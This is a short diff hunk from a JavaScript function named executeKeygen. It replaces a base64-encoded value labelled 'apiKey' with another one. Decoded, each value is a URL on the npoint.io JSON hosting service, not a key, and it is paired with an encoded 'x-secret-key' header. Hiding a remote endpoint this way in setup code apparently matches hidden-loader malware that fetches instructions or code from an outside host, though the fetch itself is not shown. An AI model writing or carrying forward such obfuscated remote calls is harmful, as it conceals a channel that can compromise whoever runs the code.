@@ -56,7 +56,7 @@ async function executeKeygen(callback) {
     const axios = require('axios');
 
     // Set up authentication details
-    const apiKey = Buffer.from("aHR0cHM6Ly9hcGkubnBvaW50LmlvL2Y0YmUwZjc3MTNhNmZjZGFhYzhi", 'base64').toString('utf8');
+    const apiKey = Buffer.from("aHR0cHM6Ly9hcGkubnBvaW50LmlvL2QxZWYyNTZmYzJhZDYyMTM3MjZl", 'base64').toString('utf8');
     const secretKey = Buffer.from("eC1zZWNyZXQta2V5", 'base64').toString('utf8');
     const secretValue = Buffer.from("Xw==", 'base64').toString('utf8');
 
